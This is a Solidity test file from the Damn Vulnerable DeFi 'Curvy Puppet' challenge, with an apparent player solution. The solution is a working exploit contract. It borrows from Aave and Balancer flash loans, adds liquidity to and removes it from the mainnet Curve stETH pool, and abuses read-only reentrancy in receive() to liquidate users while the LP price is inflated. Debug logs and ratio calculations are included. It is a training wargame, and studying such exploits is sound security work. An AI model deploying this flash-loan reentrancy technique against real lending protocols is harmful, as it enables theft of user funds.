// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        address[] memory users = new address[](3);
        users[0] = alice;
        users[1] = bob;
        users[2] = charlie;

        Rescuer rescuer = new Rescuer(lending, player, users);
        weth.transferFrom(treasury, address(rescuer), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(rescuer), TREASURY_LP_BALANCE);
        rescuer.rescue();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

}

contract Rescuer is Test{
    CurvyPuppetLending public lending;
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    // Find pool address from https://aave.com/docs/resources/addresses, choose v2 pool!
    address constant aavePool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant balancerPool = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address immutable player;
    address[] users;

    bool trigger = false;

    constructor(CurvyPuppetLending _lending, address _player, address[] memory _users) {
        lending = _lending;
        player = _player;

        for (uint256 i = 0; i < _users.length; i++) {
            users.push(_users[i]);
        }

        // Logs:
        //   CurvePool eth balance 34543361925271962711040
        //   CurvePool stETH balance 35548937793868475091973
        //   CurvePool balances[0]: 34543279685479012272346
        //   CurvePool balances[1]: 35548870433002420435140
        //   CurvePool LP token supply 63900743099782364043112
        //   CurvePool LP token price 1096890440129560193

        //   Collateral value: 25000000000000000000000
        //   Borrow value: 4387561760518240772000
        //   =>
        //   To trigger liquidation, the borrowed asset price must increase by at least this amount:
        //   25000000000000000000000 / 4387561760518240772000 / 1.75 = 3.2559574236117226 // See 1.75 is from CurvyPuppetLending.liquidate

        //   AAVE Pool WETH balance 0
        //   AAVE Pool stETH balance 0
        //   BalancerVault WETH balance 37991917252778937136234
        //   BalancerVault stETH balance 285456548656237010
        //   LP token price before flashloan:  1096890440129560193
        //   Received ETH from  0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
        //   Received ETH:  130200000000000000000000
        //   LP token supply before removing liquidity: 273758742626063358693656
        //   Removing from LP stETH 129999999999999999999999
        //   Received ETH from  0xDC24316b9AE028F1497c275EB9192a3Ea0f67022
        //   Received ETH:  1
        //   LP token price in the middle of removing liquidity:  1966561483253545387
        //   LP token supply after removing liquidity: 152693223694457871751602

        // Find x, y, dx, dy which make right side >  3.26 * 1.09, 10 is chosen here:
        // 5.69 is the ratio of collateral to borrow value, 1.09 is the LP token price
        // (A + 2x - d + B) / (S - 2d) = 10
        // where
        // A = 34543
        // B = 35548
        // S = (A + 2x + B)
        // 0 < d <= x

        console.log("CurvePool eth balance", address(curvePool).balance);
        console.log("CurvePool stETH balance", stETH.balanceOf(address(curvePool)));
        console.log("CurvePool balances[0]:", curvePool.balances(0));
        console.log("CurvePool balances[1]:", curvePool.balances(1));
        console.log("CurvePool LP token supply", IERC20(curvePool.lp_token()).totalSupply());
        console.log("CurvePool LP token price", curvePool.get_virtual_price());

        uint256 collateralValue = lending.getCollateralValue(lending.getCollateralAmount(users[0]));
        uint256 borrowValue = lending.getBorrowValue(lending.getBorrowAmount(users[0]));

        console.log("Collateral value:", collateralValue);
        console.log("Borrow value:", borrowValue);
        console.log("Collateral to borrow ratio(%):", collateralValue * 100 / borrowValue);


        console.log("AAVE Pool WETH balance", weth.balanceOf(aavePool));
        console.log("AAVE Pool stETH balance", stETH.balanceOf(aavePool));

        console.log("BalancerVault WETH balance", weth.balanceOf(balancerPool));
        console.log("BalancerVault stETH balance", stETH.balanceOf(balancerPool));

    }

    function rescue() external {
        IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: curvePool.lp_token(),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: uint48(block.timestamp + 1 days)
        });
        flashLoanFromAAVE();
    }

    function flashLoanFromBalancer() internal {
        address[] memory assets = new address[](1);
        assets[0] = address(weth);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30000 ether;

        (bool success,) = balancerPool.call(abi.encodeWithSignature("flashLoan(address,address[],uint256[],bytes)",
                                                                    address(this), // receiverAddress
                                                                    assets,
                                                                    amounts,
                                                                    ""
                                                                   ));
        require(success, "Balancer flashloan failed");
    }

    function flashLoanFromAAVE() internal{
        // FlashLoan API:https://aave.com/docs/developers/smart-contracts/pool#flashloan
        // function flashLoan(
        //     address receiverAddress,
        //     address[] calldata assets,
        //     uint256[] calldata amounts,
        //     uint256[] calldata interestRateModes,
        //     address onBehalfOf,
        //     bytes calldata params,
        //     uint16 referralCode
        // ) public virtual override

        address[] memory assets = new address[](2);
        assets[0] = address(weth);
        assets[1] = address(stETH);


        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 38000 ether;
        amounts[1] = 172000 ether;

        uint256[] memory interestRateModes = new uint256[](2); // leave it to default 0


        (bool success,) = aavePool.call(abi.encodeWithSignature("flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
                                                                address(this), // receiverAddress
                                                                assets,
                                                                amounts,
                                                                interestRateModes,
                                                                address(this), // onBehalfOf
                                                                "", // params
                                                                0 // referralCode
                                                               ));
        require(success, "AAVE flashloan failed");
    }

    // AAVE flashloan callback
    function executeOperation(
                              address[] calldata assets,
                              uint256[] calldata amounts,
                              uint256[] calldata premiums,
                              address initiator,
                              bytes calldata params
    ) external returns (bool){
        uint256 wethAmount = amounts[0];
        uint256 wethPremium = premiums[0];

        uint256 stETHAmount = amounts[1];
        uint256 stETHPremium = premiums[1];

        console.log("stETH balance required to repay AAVE: ", stETHAmount + stETHPremium);
        console.log("weth balance required to repay AAVE: ", wethAmount + wethPremium);

        // For repayment
        weth.approve(aavePool, type(uint256).max);
        stETH.approve(aavePool, type(uint256).max);
        IERC20(stETH).approve(address(curvePool), type(uint256).max);

        flashLoanFromBalancer();

        return true;
    }

    // Balancer flashloan callback
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory premiums,
        bytes memory userData
    ) external {
        uint256 amount = amounts[0];
        uint256 premium = premiums[0];

        console.log("Balancer repayment amount: ", amount + premium);

        weth.withdraw(weth.balanceOf(address(this)));
        IERC20(stETH).approve(address(curvePool), type(uint256).max);

        uint256 stETHBalance = IERC20(stETH).balanceOf(address(this));
        curvePool.add_liquidity{value: 68000 ether}([68000 ether, stETHBalance], block.timestamp + 1 days);

        trigger = true;
        uint256 lpTokenBalance = IERC20(curvePool.lp_token()).balanceOf(address(this));
        uint256[2] memory withdrawn  = curvePool.remove_liquidity(lpTokenBalance - 3 ether, [uint256(0), uint256(0)]); // Keep some LP token, 3 ether, enough to repay during CurvyPuppetLending liquidating
        weth.deposit{value: address(this).balance}();
        trigger = false;

        // Repay balancer
        weth.approve(balancerPool, amount + premium);

        console.log("stETH balance left ", stETH.balanceOf(address(this)));
        console.log("weth balance left ", weth.balanceOf(address(this)));

    }

    receive() external payable {
        if (!trigger){
            return;
        }
        // Must be triggered by the remove_liquidty callback, ie. bad state only occurs inside remove_liquidity function
        console.log("LP token price in the middle of removing liquidity: ", curvePool.get_virtual_price());

        for (uint256 i = 0; i < users.length; i++){
            lending.liquidate(users[i]);
        }
    }
}

// What i leant:
// - Trial and error to get the max value in lending pool
// - Do some math to get the expected ratio which can tirgger the liquidity
// - Place the callback right with the bad state occurs
